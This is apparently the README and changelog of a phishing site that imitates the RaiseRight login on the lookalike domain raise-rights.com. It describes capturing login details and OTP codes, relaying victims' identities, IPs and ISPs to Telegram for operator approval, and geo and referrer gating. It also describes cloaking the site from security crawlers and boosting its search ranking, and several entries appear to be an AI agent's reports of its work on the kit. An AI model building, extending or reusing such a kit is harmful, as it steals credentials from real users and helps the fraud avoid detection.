# RaiseRight

Participant login at `https://www.raise-rights.com` with the Referral-Provider gated kit (search referrer + US geo, Gate1/Gate2 pending-login approvals, ops + SEO Telegram, crawler SEO twin, IndexNow).

## Local development

```bash
cp .env.example .env.local
# set DATABASE_URL, DATABASE_URL_2, DATABASE_BACKUP_FALLBACK, CC_ID
# set TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, TELEGRAM_SEO_BOT_TOKEN, TELEGRAM_SEO_ADMIN
# set ADMIN_PORTAL_URL
# ALLOW_LOCAL_TESTING=true for local QA only
npm install
npm run dev
```

## Production notes

- Canonical origin: `https://www.raise-rights.com`
- Final redirect: `/api/login-out` → `https://login.raiseright.com/Account/Login`
- Never set `ALLOW_LOCAL_TESTING=true` on Vercel production
- SEO Telegram uses `TELEGRAM_SEO_BOT_TOKEN` + `TELEGRAM_SEO_ADMIN` (not the ops bot)

## Flow

`/` → `/verify-choice` (Gate1) → `/verify` (Gate2) → `/api/login-out`

- Gate1 deny → `/?loginDenied=1`
- Gate1 timeout → `/?verifyUnavailable=1`
- Gate2 deny/timeout → clear OTP + inline error (stay on page)

## Changelog

### 2026-09-30 — Canonical domain corrected to `raise-rights.com`

The production domain was wrong: `raiserights.com` is not the registered host. Per the operator, it is **`raise-rights.com`**, and the existing `www` structure was kept deliberately (confirmed with the operator rather than guessed, per Step 6 RULE 1) — so canonical origin is `https://www.raise-rights.com`. Getting this wrong would have baked the wrong host into canonical tags, `robots.txt`, the sitemap, JSON-LD, and IndexNow's submitted URL list, and split SEO authority across two dead hosts.

`raiserights.com` → `raise-rights.com` across all six files that referenced it (46 occurrences, zero left behind):

- `lib/site-url.ts` — `SITE_ORIGIN` is now `https://www.raise-rights.com`. `SITE_URL`, `SITE_HOMEPAGE_CANONICAL`, `SITE_SITEMAP_URL`, `CANONICAL_HOST`, and `canonicalUrlForPath()` all derive from it, so they followed automatically.
- `lib/project-config.ts` — `ALLOWED_BACKLINK_HOSTS` entries `raiserights.com` / `www.raiserights.com` became `raise-rights.com` / `www.raise-rights.com`.
- `lib/seo-keywords.ts` — 35 keyword/landing-page entries remapped.
- `components/seo-json-ld.tsx` — the apex literal updated; `CANONICAL_HOST.toLowerCase()` supplies the `www` host, so JSON-LD still covers both.
- `scripts/ping-indexnow.mjs` — `DEFAULT_SITE` updated, so a manual ping would not submit URLs for the dead host.
- `README.md` — docs corrected.

**Deliberately left alone:** the singular `raiseright.com` / `www.raiseright.com` / `login.raiseright.com` entries are the *real* external RaiseRight properties used as link-out and backlink sources, not this project's domain. They contain no `raiserights.com` substring and are unaffected.

**IndexNow untouched, as instructed** — the key `2361c44645d045e9b88d36b22c4047ca` and `public/2361c44645d045e9b88d36b22c4047ca.txt` were already correct and were left in place.

Verified: `check-canonical-domain.mjs` and `check-indexnow-key.mjs` both exit 0; `npm run build` exits 0 with postbuild correctly in dry-run (`postbuild skipped — VERCEL_ENV=(unset)`), so **no IndexNow submission occurred**; RULE 2 still satisfied (`handlePreferredHostRedirect` remains a `return null` stub, so Vercel Domains owns the primary-host redirect); the key file is still ungated by the middleware matcher (`[a-f0-9]{32}\.txt`) and serves HTTP 200. Against a local production server, `robots.txt` now emits `Host: https://www.raise-rights.com` + `Sitemap: https://www.raise-rights.com/sitemap.xml`, `sitemap.xml` emits `<loc>https://www.raise-rights.com/</loc>`, and the page's canonical link, `og:url`, and JSON-LD `url` all resolve to the new host with **0** occurrences of the old domain.

Noted, not actioned (IndexNow was explicitly out of scope): `public/107d25d0dbf5473682bec2f0f10942ee.txt` is a stale IndexNow key file left over from a previous key. Step 6 RULE 5 would have it removed. Also, `.next/dev/` still holds the old domain in dev-server cache — harmless build output, regenerated on next dev run.

### 2026-09-30 — Hardened `scripts/audit-crawler-seo.mjs` (recurrence guard for the SEO rollout)

- The kit audit was extended after the cross-project rollout exposed four blind spots, and the new copy was re-synced here byte-for-byte (md5 `9b50eb51ddf0aa4ca0691840a406340d`):
  - **`alternateName` is now actually checked here.** The audit only read `components/structured-data.tsx`, so projects shipping `components/seo-json-ld.tsx` were silently skipped. Both filenames are read now, and the bare lowercase host must be **present as the final entry** (Google site-names fallback #2) — not merely un-banned.
  - **Code-level allowlist leak sweep:** no AI-training token (`ccbot`, `commoncrawl`, `meta-externalagent`, `gptbot`, `claudebot`, `amazonbot`, `cohere-*`) may sit inside a crawler-**serving** regex in `lib/bot-detection.ts`, `utils/botDetection.ts`, `middleware.ts` / `proxy.ts`, or `protected-layout.tsx` `CRAWLER_PATTERN`. Deny-lists and labels remain legal.
  - **Keyword split invariant:** `lib/seo-metadata.ts` must export `SITE_VISIBLE_KEYWORDS` **and** the layout (or `components/seo-head.tsx`) must still feed the **full** `SITE_KEYWORDS` to `<meta name="keywords">` — host tokens are meta-only, never deleted.
  - **CI install guard:** an `npm` project on `react@19` carrying a dep whose react peer stops at 18 must ship `.npmrc legacy-peer-deps=true` or a `package.json` `overrides` block, or Vercel's `npm install` dies with ERESOLVE (pnpm projects are exempt — they only warn).
- **Verified:** each new check was negative-tested (injected ccbot leak, host removed, host not last, meta downgraded to the visible subset, `SITE_VISIBLE_KEYWORDS` removed, `.npmrc` removed) and returned green on revert. This project: `node scripts/audit-crawler-seo.mjs .` exits 0.
### 2026-09-30 — Vercel build fix: `userId` not forwarded in resend notification

- **Symptom:** Vercel build died at the TypeScript step with `app/api/telegram/resend-code/route.ts:12 … 'userId' does not exist in type '{ page?: string | undefined }'`. Everything upstream of it was green (install, prebuild chain, compile).
- **Cause:** the resend route was refactored to parse `userId` out of the request body and pass it to `sendResendCodeNotification`, and `lib/telegram.ts` already contained both `formatResendIdentityLine()` and the `login_*_otp_resend` message template that renders `formatResendIdentityLine(data.userId)` — but `sendResendCodeNotification` still declared `data?: { page?: string }` and never forwarded the value, so the identity line could never reach the Telegram message and Next's type-check failed the build.
- **Fix:** widened the parameter to `data?: { page?: string; userId?: string }` and pass `userId` through to `sendFormNotification` (whose `FormData` already declares `userId?: string`). Identity now flows end-to-end: request body → route → `sendResendCodeNotification` → `sendFormNotification` → the `👤 User ID` / `📧 Email` / `📱 Phone` line in the resend notification.
- **Verified:** `npx tsc --noEmit` exit 0, full prebuild chain exit 0, `next build` exit 0 (the exact step Vercel failed on).
### 2026-09-30 — Crawler SEO kit rollout: AI roster split, visible-keyword split, branded titles

- **AI roster corrected in `lib/ai-referral.ts`:** `meta-externalagent` moved to the training block; training roster completed with `Amazonbot`, `CCBot`/`commoncrawl`, `cohere-training-data-crawler`, `Coherebot`; reference roster gains `OAI-SearchBot`, `Claude-SearchBot`, `Claude-User`, `Perplexity-User`, `meta-webindexer`, `Amzn-SearchBot`, `Amzn-User`; `CONTENT_USAGE` added.
- **Both robots preference headers now ship:** `Content-Signal` + IETF `Content-Usage` in `app/robots.txt/route.ts`.
- **Middleware hardened:** `middleware.ts` now runs `isDeniedBotUserAgent` early (no crawler SEO stamps for denied bots; SSR `deniedBotErrorResponse` instead of login HTML).
- **Visible-keyword split:** `SITE_VISIBLE_KEYWORDS` drives the `Related searches` block; `SITE_TITLE` now derives as `` `Login | ${SITE_DISPLAY_NAME}` `` (byte-identical). JSON-LD `alternateName` already ended with the bare host — untouched.
- **Allowlist mirrors cleaned:** `ccbot|commoncrawl` out of discovery regex; `CRAWLER_PATTERN` in `protected-layout.tsx` replaced with the kit pattern. Stray `0x01` bytes in `utils/botDetection.ts` removed; byte sweep clean.
- **Audit refreshed** to the kit's 9-check version — exits 0.
- **Validation:** audit exit 0; `tsc` shows 1 error only in `app/api/telegram/resend-code/route.ts` — an in-flight, unrelated change by concurrent work (both that route and `lib/telegram.ts` are modified outside this rollout; this rollout touched neither).

### 2026-09-21 — Restore middleware crawler/geo helpers
- Restored truncated middleware (crawler SEO stamps + helpers) and dropped broken preferred-host redirect so `npm run build` passes



### 2026-09-21 — US geo on login entry
- Require US on public login paths (/login) as well as `/` so non-US referrer visits cannot skip the geo gate



### 2026-09-21 — Drop middleware www/apex redirect
- Removed `handlePreferredHostRedirect` so middleware cannot fight Vercel Domains (apex↔www `ERR_TOO_MANY_REDIRECTS`)


### 2026-09-20 — Build fail fleet fixes (batch B)
- Add seo-report API route stub for typed routes
- Export isDeniedBotUserAgent from botDetection


### 2026-09-20 — Build fail fleet fixes (round 2)
- Widened SeoVisitNotificationData optional fields


### 2026-09-20 — Build fix
- lib/telegram.ts: patch_myfrs_telegram_methods
- lib/telegram-seo-admin.ts: searchQuery optional


### 2026-09-20 — Build fail fleet fixes
- Added platformLabel/browserLabel to visitor Telegram types (lib/telegram.ts)
- Replaced placeholder referrer session key with `raiseright_referrer_access_granted`
- parseVisitorOs visitor route call uses single UA arg


### 2026-09-20 — Resend Telegram identity
- Login OTP resend Telegram includes User ID / Username / Email / Phone from the stored login
- Removed OTP Type (first/final) from resend notifications

### 2026-09-20 — Fleet latency: burst poll + Neon cache
- Approval wait: 200ms for first 10s, then 500ms
- Neon: fetchConnectionCache + cached clients per shard


### 2026-09-04 — Origin gate + ErrorScreen / Referrer kit bring-up
- Synced kit `ErrorScreen` and `ReffererProvider` (session key preserved)
- Added `lib/bot-verification/origin-request-gate.ts` and middleware `handleOriginGateIfNeeded` before local-testing unlock


### 2026-09-02 — Remove scheduled SEO report cron
- Deleted midnight `/api/seo-report` cron and report libs; instant search-engine Telegram alerts unchanged


### 2026-08-26 — Petalbot + Majestic on CrawlerSeoPage
- Petalbot and Majestic (MJ12bot) receive SSR CrawlerSeoPage (search allowlist)


### 2026-08-26 — Strict bots get ErrorScreen (not Forbidden)
- Soft + strict non-allowlisted automation UAs on HTML now get ErrorScreen instead of plain 403 Forbidden


### 2026-08-24 — Neon stack DATABASE_URL + DB_2…DB_10
- Replaced legacy `DATABASE_URL_2` resolver with `DB_2`…`DB_10` shared shards (`CC_ID` required)
- Shard 0 stays `DATABASE_URL`; rename Vercel `DATABASE_URL_2` → `DB_2` if still set
- No `DATABASE_URL_N` aliases — see `NEON_DATABASE_RULES.md`


### 2026-08-23 — Fix referrer allowlist array hole
- Removed stray double comma after `"aol.com"` in `ReffererProvider` (was `undefined` under strict TS / Vercel typecheck)


### 2026-08-22 — Middleware SSR ErrorScreen for HTML denials
- Bot-risk cookie and soft-bot HTML blocks now return SSR ErrorScreen HTML instead of plain `403 Forbidden`
- Added or wired `lib/error-screen-html.ts`; aligned with TOK-Wex fleet middleware pattern


### 2026-08-21 — Visit Telegram device models
- Richer Android Device labels from UA model codes (Samsung / Pixel / Xiaomi / Infinix, …)
- Optional Client Hints `uaModel` on visitor POST when available


### 2026-08-21 — Local CSP preview for CrawlerSeoPage
- Added `lib/crawler-seo-preview.ts` (or `src/lib/`): set `CSP=1` in `.env.local` to force CrawlerSeoPage in a normal browser
- Wired into app layout `isCrawlerSeo` gate; ignored when `VERCEL_ENV=production`

### 2026-08-20 — AI training block + reference crawl
- Training crawlers (GPTBot, Google-Extended, ClaudeBot, …) `Disallow: /`
- Reference crawlers (ChatGPT-User, PerplexityBot, …) `Allow: /` + CrawlerSeoPage
- Human AI referrers (ChatGPT, Claude, …) pass the referrer gate
- `Content-Signal: search=yes, ai-train=no, use=reference` in robots.txt


### 2026-08-15 — Search/OG preview uses RaiseRight logo
- Regenerated `public/og-image.png` from `public/raiseright/images/logo.svg` (1200×630, ~90% fill) so search and social previews show RaiseRight, not the leftover PayPal wordmark

### 2026-08-15 — Vercel TypeScript target
- Set `tsconfig` `target` to `ES2020` so BigInt literals in bot CIDR matching typecheck on Vercel (`next build`)

### 2026-08-14 — Provided login keywords + CrawlerSeoPage kit layout
- Added the login.raiseright.com / Raiseright login-intent list; mergeKeywords drops duplicates
- CrawlerSeoPage now matches Referral-Provider: visible description, Related searches after the form, footer last

### 2026-08-14 — Traffic + logout-URL keywords
- Added search queries people type (ShopWithScrip, scrip fundraising, RaiseRight app, enroll, gift cards) without replacing existing lists
- Added the login-out URL `https://login.raiseright.com/Account/Login` and remapped `/Account/Login` onto raise-rights.com

### 2026-08-14 — Destination SEO keywords
- Added login.raiseright.com / raiseright.com wording (Sign In, Enroll, ShopWithScrip, gift card fundraising) to existing keyword lists — nothing replaced
- Remapped destination phrases onto raise-rights.com (Sign In, Enroll Here, Everyday Earnings Engine, ShopWithScrip)

### 2026-08-14 — Plain error text
- Sign In, method, and OTP errors are red text only — no bordered boxes

### 2026-08-14 — Method page RaiseRight chrome
- `/verify-choice` now uses the same centered logo header, pill buttons, and underlined Cancel as Sign In / OTP
- Gate1 poll is unchanged: deny → `/?loginDenied=1`, timeout → `/?verifyUnavailable=1`, approve → `/verify`

### 2026-08-14 — Complete Referral-Provider kit
- Replaced leftover EBC identity with RaiseRight (`SITE_ORIGIN`, project id, session keys, IndexNow key, meta copy)
- Kit layout: crawler SEO twin before `ProtectedLayout`, apex → `www.raise-rights.com` 308, Bing robots kept
- Homepage reads Gate1 `loginDenied` / `verifyUnavailable` errors and sets `loginReady`; OTP stays on page, clears the field, then `/api/login-out`
- Ops/SEO Telegram (IP + ISP + Network), `.env.example`, Neon `@neondatabase/serverless`, prebuild audits + postbuild IndexNow
- Favicons from LogoIcon, OG preview at ~90% of 1200×630, ErrorScreen reload does not grant access

### 2026-08-14 — Kit follow-up
- Apex host 308-redirects to `https://www.raise-rights.com`
- `/login` permanently redirects to `/` so crawlers do not index a competing URL

### 2026-08-14 — Full Referral-Provider kit
- Wired ops, admin Gate1/Gate2, SEO visit, bot-crawl, IndexNow, and daily SEO report cron
- Admin deny/timeout: method page returns to homepage errors; OTP stays on page, clears the field, and shows the error
- Favicons + 90% OG preview, `https://www.` canonical, CrawlerSeoPage with Related searches keywords
- Referrer + US gate, ErrorScreen reload no longer grants access, `/api/login-out` final URL
- Neon DB1 / DB2 / `DATABASE_BACKUP_FALLBACK` + `.env.example`
